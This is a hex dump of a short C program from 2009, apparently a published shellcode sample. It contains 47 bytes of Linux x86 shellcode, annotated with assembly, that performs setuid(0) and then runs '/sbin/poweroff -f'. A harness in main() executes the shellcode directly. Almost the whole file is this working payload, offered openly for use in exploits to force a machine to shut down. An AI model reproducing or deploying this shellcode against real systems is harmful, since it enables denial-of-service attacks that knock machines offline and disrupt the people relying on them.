00000000  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000010  68 3e 0d 0a 20 0d 0a 2f  2a 0d 0a 20 20 20 20 6c  |h>.. ../*..    l|
00000020  69 6e 75 78 2f 78 38 36  20 3b 20 73 65 74 75 69  |inux/x86 ; setui|
00000030  64 28 30 29 20 26 20 65  78 65 63 76 65 28 22 2f  |d(0) & execve("/|
00000040  73 62 69 6e 2f 70 6f 77  65 72 6f 66 66 20 2d 66  |sbin/poweroff -f|
00000050  22 29 20 34 37 20 62 79  74 65 73 0d 0a 20 20 20  |") 47 bytes..   |
00000060  20 77 72 69 74 74 65 6e  20 62 79 20 6b 61 30 78  | written by ka0x|
00000070  20 2d 20 3c 6b 61 30 78  30 31 5b 61 6c 74 2b 36  | - <ka0x01[alt+6|
00000080  34 5d 67 6d 61 69 6c 2e  63 6f 6d 3e 0d 0a 20 20  |4]gmail.com>..  |
00000090  20 20 6c 75 6e 20 73 65  70 20 32 31 20 31 36 3a  |  lun sep 21 16:|
000000a0  34 30 3a 31 36 20 43 45  53 54 20 32 30 30 39 0d  |40:16 CEST 2009.|
000000b0  0a 20 0d 0a 20 20 20 20  67 72 65 65 74 73 3a 20  |. ..    greets: |
000000c0  61 6e 30 64 65 2c 20 50  69 6b 65 72 2c 20 78 61  |an0de, Piker, xa|
000000d0  72 6e 75 7a 2c 20 4e 75  6c 6c 57 61 76 65 30 37  |rnuz, NullWave07|
000000e0  2c 20 50 65 70 65 6c 75  78 2c 20 4a 6f 73 53 2c  |, Pepelux, JosS,|
000000f0  20 73 63 68 33 6d 34 2c  20 54 72 61 6e 63 65 6b  | sch3m4, Trancek|
00000100  2c 20 48 65 6e 64 72 69  78 20 61 6e 64 20 6f 74  |, Hendrix and ot|
00000110  68 65 72 73 21 0d 0a 2a  2f 0d 0a 20 0d 0a 69 6e  |hers!..*/.. ..in|
00000120  74 20 6d 61 69 6e 28 29  0d 0a 7b 0d 0a 20 20 20  |t main()..{..   |
00000130  20 63 68 61 72 20 73 68  65 6c 6c 63 6f 64 65 5b  | char shellcode[|
00000140  5d 20 3d 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |] =..           |
00000150  20 22 5c 78 33 31 5c 78  64 62 22 20 20 20 20 20  | "\x31\xdb"     |
00000160  20 2f 2f 20 78 6f 72 20  65 62 78 2c 65 62 78 0d  | // xor ebx,ebx.|
00000170  0a 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |.            "\x|
00000180  36 61 5c 78 31 37 22 20  20 20 20 20 20 2f 2f 20  |6a\x17"      // |
00000190  70 75 73 68 20 62 79 74  65 20 30 78 31 37 0d 0a  |push byte 0x17..|
000001a0  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 35  |            "\x5|
000001b0  38 22 20 20 20 20 20 20  20 20 20 20 2f 2f 20 70  |8"          // p|
000001c0  6f 70 20 65 61 78 0d 0a  20 20 20 20 20 20 20 20  |op eax..        |
000001d0  20 20 20 20 22 5c 78 63  64 5c 78 38 30 22 20 20  |    "\xcd\x80"  |
000001e0  20 20 20 20 2f 2f 20 69  6e 74 20 38 30 68 0d 0a  |    // int 80h..|
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 38  |            "\x8|
00000200  64 5c 78 34 33 5c 78 30  62 22 20 20 20 20 20 20  |d\x43\x0b"      |
00000210  2f 2f 20 6c 65 61 20 65  61 78 2c 5b 65 62 78 2b  |// lea eax,[ebx+|
00000220  30 78 62 5d 0d 0a 20 20  20 20 20 20 20 20 20 20  |0xb]..          |
00000230  20 20 22 5c 78 39 39 22  20 20 20 20 20 20 20 20  |  "\x99"        |
00000240  20 20 2f 2f 20 63 64 71  0d 0a 20 20 20 20 20 20  |  // cdq..      |
00000250  20 20 20 20 20 20 22 5c  78 35 32 22 20 20 20 20  |      "\x52"    |
00000260  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 65 64  |      // push ed|
00000270  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 22  |x..            "|
00000280  5c 78 36 36 5c 78 36 38  5c 78 36 36 5c 78 36 36  |\x66\x68\x66\x66|
00000290  22 20 20 2f 2f 20 70 75  73 68 20 77 6f 72 64 20  |"  // push word |
000002a0  30 78 36 36 36 36 0d 0a  20 20 20 20 20 20 20 20  |0x6666..        |
000002b0  20 20 20 20 22 5c 78 36  38 5c 78 37 37 5c 78 36  |    "\x68\x77\x6|
000002c0  35 5c 78 37 32 5c 78 36  66 22 20 20 2f 2f 20 70  |5\x72\x6f"  // p|
000002d0  75 73 68 20 64 77 6f 72  64 20 30 78 36 66 37 32  |ush dword 0x6f72|
000002e0  36 35 37 37 0d 0a 20 20  20 20 20 20 20 20 20 20  |6577..          |
000002f0  20 20 22 5c 78 36 38 5c  78 36 65 5c 78 32 66 5c  |  "\x68\x6e\x2f\|
00000300  78 37 30 5c 78 36 66 22  20 20 2f 2f 20 70 75 73  |x70\x6f"  // pus|
00000310  68 20 64 77 6f 72 64 20  30 78 36 66 37 30 32 66  |h dword 0x6f702f|
00000320  36 65 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |6e..            |
00000330  22 5c 78 36 38 5c 78 32  66 5c 78 37 33 5c 78 36  |"\x68\x2f\x73\x6|
00000340  32 5c 78 36 39 22 20 20  2f 2f 20 70 75 73 68 20  |2\x69"  // push |
00000350  64 77 6f 72 64 20 30 78  36 39 36 32 37 33 32 66  |dword 0x6962732f|
00000360  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |..            "\|
00000370  78 38 39 5c 78 65 33 22  20 20 20 20 20 20 2f 2f  |x89\xe3"      //|
00000380  20 6d 6f 76 20 65 62 78  2c 65 73 70 0d 0a 20 20  | mov ebx,esp..  |
00000390  20 20 20 20 20 20 20 20  20 20 22 5c 78 35 32 22  |          "\x52"|
000003a0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
000003b0  68 20 65 64 78 0d 0a 20  20 20 20 20 20 20 20 20  |h edx..         |
000003c0  20 20 20 22 5c 78 36 36  5c 78 36 38 5c 78 32 64  |   "\x66\x68\x2d|
000003d0  5c 78 36 36 22 20 20 2f  2f 20 70 75 73 68 20 77  |\x66"  // push w|
000003e0  6f 72 64 20 30 78 36 36  32 64 0d 0a 20 20 20 20  |ord 0x662d..    |
000003f0  20 20 20 20 20 20 20 20  22 5c 78 38 39 5c 78 65  |        "\x89\xe|
00000400  31 22 20 20 20 20 20 20  2f 2f 20 6d 6f 76 20 65  |1"      // mov e|
00000410  63 78 2c 65 73 70 0d 0a  20 20 20 20 20 20 20 20  |cx,esp..        |
00000420  20 20 20 20 22 5c 78 35  32 22 20 20 20 20 20 20  |    "\x52"      |
00000430  20 20 20 20 2f 2f 20 70  75 73 68 20 65 64 78 0d  |    // push edx.|
00000440  0a 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |.            "\x|
00000450  35 31 22 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |51"          // |
00000460  70 75 73 68 20 65 63 78  0d 0a 20 20 20 20 20 20  |push ecx..      |
00000470  20 20 20 20 20 20 22 5c  78 35 33 22 20 20 20 20  |      "\x53"    |
00000480  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 65 62  |      // push eb|
00000490  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 22  |x..            "|
000004a0  5c 78 38 39 5c 78 65 31  22 20 20 20 20 20 20 2f  |\x89\xe1"      /|
000004b0  2f 20 6d 6f 76 20 65 63  78 2c 65 73 70 0d 0a 20  |/ mov ecx,esp.. |
000004c0  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 63 64  |           "\xcd|
000004d0  5c 78 38 30 22 20 3b 20  20 20 20 20 20 20 20 2f  |\x80" ;        /|
000004e0  2f 20 69 6e 74 20 38 30  68 0d 0a 20 0d 0a 20 20  |/ int 80h.. ..  |
000004f0  20 20 70 72 69 6e 74 66  28 22 5b 2a 5d 20 53 68  |  printf("[*] Sh|
00000500  65 6c 6c 43 6f 64 65 20  73 69 7a 65 20 28 62 79  |ellCode size (by|
00000510  74 65 73 29 3a 20 25 64  5c 6e 5c 6e 22 2c 20 73  |tes): %d\n\n", s|
00000520  69 7a 65 6f 66 28 73 68  65 6c 6c 63 6f 64 65 29  |izeof(shellcode)|
00000530  2d 31 20 29 3b 0d 0a 20  20 20 20 28 2a 28 76 6f  |-1 );..    (*(vo|
00000540  69 64 28 2a 29 28 29 29  20 73 68 65 6c 6c 63 6f  |id(*)()) shellco|
00000550  64 65 29 28 29 3b 0d 0a  20 20 20 20 20 0d 0a 20  |de)();..     .. |
00000560  20 20 20 72 65 74 75 72  6e 20 30 3b 0d 0a 7d     |   return 0;..}|
0000056f
